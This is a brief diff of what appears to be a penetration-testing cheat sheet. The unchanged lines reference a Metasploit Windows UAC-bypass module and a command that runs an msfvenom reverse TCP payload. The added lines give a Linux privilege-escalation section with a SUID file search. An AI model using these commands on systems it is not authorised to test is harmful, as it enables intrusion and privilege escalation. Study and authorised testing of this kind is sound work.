@@ -969,3 +969,9 @@ exploit/windows/local/bypassuac_eventvwr <> windows 7 No hotfixes
         /usr/share/metasploit-framework/data/post/bypassuac-x64.exe
         bypassuac-x64.exe /c C:\Users\eLS\Desktop\msfvenom_reverse_tcp.exe 
 ```
+# QUICK LINUX PRIVESC WINS
+```bash
+SUID
+find / -perm -4000 2>/dev/null
+
+```
